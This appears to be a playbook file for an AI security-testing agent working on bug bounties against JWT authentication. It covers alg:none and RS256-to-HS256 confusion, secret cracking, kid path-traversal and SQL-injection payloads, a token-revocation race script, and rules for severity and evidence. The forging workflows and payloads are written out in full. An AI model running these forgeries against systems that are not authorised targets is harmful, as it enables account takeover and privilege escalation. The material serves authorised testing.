---
description: JWT deep-dive — algorithm confusion, key disclosure, weak secrets, kid traversal, LSR race, cty confusion. Load when a request carries a Bearer JWT or you've harvested one.
globs:
---

# JWT Deep-Dive Playbook

Load when: a request carries an `Authorization: Bearer <jwt>` header, or `harvest_identifiers` flagged a JWT in proxy history, or the target's auth model is OAuth/OIDC.

## JWT attack tree

```
JWT
├── Algorithm
│   ├── alg:none                    # Critical — server-side signature removal
│   ├── alg confusion (RS→HS)       # Critical — sign with public key as HMAC secret
│   ├── alg confusion (ES256→HS256) # Critical — same vector, different curve
│   └── alg downgrade               # High — server accepts weaker alg than issued
├── Key
│   ├── HS256 weak secret           # Critical — dictionary-crackable
│   ├── jku header swap             # Critical — attacker-controlled JWKS URL
│   ├── x5u header swap             # Critical — attacker-controlled cert URL
│   ├── jwk header embed            # Critical — attacker key inline
│   ├── kid path traversal          # High — load /etc/passwd as HMAC key
│   ├── kid SQL injection           # High — load attacker key from DB
│   └── Known MachineKey / KeyVault | Critical
├── Claims
│   ├── exp / nbf / iat manipulation  # Medium-High — depending on enforcement
│   ├── role / admin claim swap       # Critical — straightforward privesc
│   ├── iss / aud confusion           # High — cross-tenant if multi-tenant
│   ├── sub / userid swap             # Critical — full ATO
│   └── jti replay                    # Medium — when jti is enforced
├── Header (W12 W13 additions)
│   ├── cty content-type confusion    # High — body re-parsed as XML/HTML
│   └── typ confusion                 # Medium — JWS vs JWT distinction
└── Lifecycle
    ├── LSR (Last-Stored-Result) race  # High — revoke + use concurrently (W12)
    ├── Logout doesn't revoke          # Medium — session lifecycle gap
    └── Cross-session token replay     # Medium — token bound to wrong principal
```

## Tool chain

1. **Decode + analyse** — `test_jwt(token)` returns VerdictResult with header/payload claims, detected vulns, follow-up tests, notes. CRITICAL on alg:none / jku / x5u present.
2. **Forge per attack** — `forge_jwt(original_token, attack='alg_none' | 'rs_to_hs' | 'kid_traversal' | 'jku' | 'x5u' | 'claim_swap' | 'jwk_embed')` returns the forged token. Modes built per native attack vector — no external dep.
3. **HS secret crack** — `crack_jwt_secret(token, wordlist='top1000')` runs HS256/384/512 dictionary attack. CRITICAL when cracked.
4. **Test the forge** — `curl_request` with the forged token, replay through Burp, observe authorisation outcome.
5. **Race (W12)** — `concurrent_requests` with revoke-token + use-token streams to test LSR race.

## Quick triage matrix

When you encounter a JWT, the first 30 seconds:

| Header field | Signal | Severity if exploitable |
|---|---|---|
| `alg = none` / `None` / empty | Critical — sign-removed JWT accepted? | Critical (ATO) |
| `alg = HS256` and `kid` looks like file path | kid traversal | High |
| `alg = HS256` and short secret hint (short kid / tenant name) | weak HMAC secret crackable | Critical |
| `alg = RS256` | RS→HS confusion candidate; pull pubkey from `/.well-known/jwks.json` | Critical |
| `jku` field present | Attacker-controlled JWKS URL | Critical |
| `x5u` field present | Attacker-controlled cert chain | Critical |
| `jwk` field present (inline key) | Replace with attacker key | Critical |
| `cty = application/xml` / unusual | cty content-type confusion (W12) | High |

For payload claims: `role = admin`, `is_admin = true`, `permissions = [...]` — direct privesc candidates via `forge_jwt(attack='claim_swap')`.

## Algorithm confusion (RS→HS) — the workflow

1. Token is RS256: `eyJhbGciOiJSUzI1NiJ9...`
2. Pull the issuer's pubkey: `curl https://target/.well-known/jwks.json` → pick the matching `kid` key.
3. PEM-encode the pubkey: `openssl rsa -pubin -in pubkey.pem -RSAPublicKey_out` or use the modulus / exponent directly.
4. `forge_jwt(original_token, attack='rs_to_hs', secret=<exact_pubkey_bytes>)` returns a new token signed HS256 with the pubkey as HMAC key.
5. Replay. If the server accepts, the validation code is using "alg as user-supplied" instead of "alg as server-fixed" — full ATO.

The pubkey-as-secret has to be EXACT byte sequence the server uses (including trailing newlines). If first attempt fails, try `forge_jwt(..., secret_variant='pem'|'der'|'modulus_only')`.

## kid traversal — when kid looks like file path

```
{"alg":"HS256","typ":"JWT","kid":"keys/2024/prod.pem"}
```

Try:
```python
forge_jwt(original, attack='kid_traversal', kid_path='/dev/null', secret='')
forge_jwt(original, attack='kid_traversal', kid_path='/etc/passwd', secret='<contents of passwd>')
forge_jwt(original, attack='kid_traversal', kid_path="' UNION SELECT 'mykey'--", secret='mykey')
```

Server reads file at `kid` path, uses contents as HMAC secret. If file is attacker-predictable (empty / known contents / SQL-injectable lookup), forge succeeds.

## LSR race (W12)

Last-Stored-Result race: revoke-token endpoint writes to a cache asynchronously. Window between "revoke acked" and "cache updated" allows the revoked token to authenticate.

```python
# Fire 2 streams concurrently
concurrent_requests(requests=[
    {"method": "POST", "url": "/revoke-token", "headers": {"Authorization": f"Bearer {tok}"}},
    {"method": "GET",  "url": "/protected",   "headers": {"Authorization": f"Bearer {tok}"}},
], concurrency=2)
```

If `/protected` returns 200 AFTER `/revoke-token` acked, the revoke is asynchronous and races against use. High severity for session-lifecycle programs.

## Evidence ladder

| Verdict | Evidence shape | Save? |
|---|---|---|
| **CONFIRMED CRITICAL** | Forged token authenticates as victim (full ATO demonstrated) | yes |
| **CONFIRMED HIGH** | Forged token bypasses one auth check (e.g. role claim accepted but resource ownership still gates) | yes |
| **SUSPECTED** | Algorithm confusion / weak secret detected; forge attempted; server rejects but with abnormal error message | NO — keep iterating |
| **FAILED** | Server validates correctly | NO |

## Severity discipline

- alg:none accepted = CRITICAL (full ATO).
- HS256 weak-secret cracked + forged + admin role accepted = CRITICAL.
- jku/x5u/jwk header swap accepted = CRITICAL.
- kid traversal that reads attacker-predictable file = CRITICAL.
- Decoded JWT reveals `is_admin: true` in payload — NOT a vulnerability. JWTs are inspectable by design.
- Expired token accepted past exp by a few seconds — LOW (clock skew tolerance is intentional).

## NEVER_SUBMIT traps

- "JWT contains PII in payload" — JWTs are base64, not encrypted. Programs reject this as informational. NEVER_SUBMIT alone.
- "JWT has long expiration" — operator preference, not vulnerability.
- "Algorithm none reported by static analysis without runtime test" — must demonstrate the server accepts the forged token.

## save_finding shape

```python
save_finding(
    vuln_type="jwt",
    endpoint="https://api.example.com/me",
    parameter="Authorization",
    severity="critical",                                # forge succeeded
    evidence={
        "logger_index": <forge-accepted index>,
        "summary": "JWT alg confusion (RS256 → HS256) — forged token signed with /.well-known/jwks.json pubkey as HMAC secret accepted at /me, returns victim profile",
        "original_alg": "RS256",
        "forged_alg": "HS256",
        "attack": "rs_to_hs",
        "baseline_status": 401,
    },
)
```

## Chain patterns

- **JWT alg:none → ATO** = direct.
- **JWT kid traversal + path traversal** = file disclosure → HMAC forge → ATO.
- **JWT weak secret + admin claim swap** = privesc.
- **JWT LSR race + revoke endpoint** = session bypass.
- **OAuth code injection + JWT replay** = federated identity bypass.

## Related

- `knowledge/jwt.json` — payload-level signals (W12 added cty_content_type_confusion + lsr_revoke_race)
- `knowledge/oauth.json` — issuer / JWKS swap class
- `test_jwt`, `forge_jwt`, `crack_jwt_secret` — VerdictResult-returning tools (W9)
- `test_login_bypass`, `test_session_lifecycle` — adjacent auth
- `chain-findings.md` — ATO progression
